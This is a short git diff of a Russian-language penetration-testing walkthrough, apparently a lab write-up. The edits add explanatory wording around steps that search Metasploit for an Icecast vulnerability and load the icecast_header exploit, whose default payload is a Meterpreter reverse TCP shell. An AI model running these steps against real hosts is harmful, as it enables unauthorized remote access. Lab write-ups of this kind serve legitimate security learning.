@@ -24,7 +24,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 65.59 seconds
 ```
 
-откроем msfconsole и попробуем найти уязвимости для службы icecast:
+Самое интересное тут, это служма запущеная на порту 8000. откроем msfconsole и попробуем найти уязвимости для службы icecast:
 ```
 msf > search icecast
 
@@ -35,7 +35,7 @@ Matching Modules
    -  ----                                 ---------------  ----   -----  -----------
    0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
 ```
-отлично, нам нужно использовать этот эксплоит 
+отлично, нам нужно использовать этот эксплоит, вводим use и путь к файлу эксплойта: 
 ```
 msf > use exploit/windows/http/icecast_header 
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
